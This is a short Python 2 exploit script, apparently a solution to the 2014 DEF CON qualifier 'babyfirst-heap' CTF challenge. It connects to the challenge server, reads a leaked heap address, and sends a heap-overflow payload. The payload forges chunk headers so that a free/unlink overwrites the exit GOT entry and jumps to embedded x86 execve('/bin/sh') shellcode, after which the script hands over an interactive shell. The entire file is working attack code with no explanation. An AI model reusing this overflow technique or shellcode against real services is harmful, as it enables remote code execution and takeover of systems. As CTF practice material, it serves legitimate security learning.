import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

host = 'babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me'
port = 4088

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

readuntil(f, "[size=755]\n[ALLOC][loc=")
heap_begin = readuntil(f, "][size=260]")

heap_begin =  int(heap_begin, 16)

print hex(heap_begin)

readuntil(f, "[size=260]:\n")

exit_got = 0x0804c020 - 4
pay =  p(heap_begin + 16) + p(exit_got)
sc = "\xeb\x12" + "\x90" * 18 + "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
pay += sc + 'A' * (260 - 8 - len(sc)) + '\x08\x01\x00\x00' + 'A' * 260 + '\x08\x01\x00\x00' + p(heap_begin + 16) + p(exit_got) + 'A' * (260 - 8)

f.write(pay + "\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
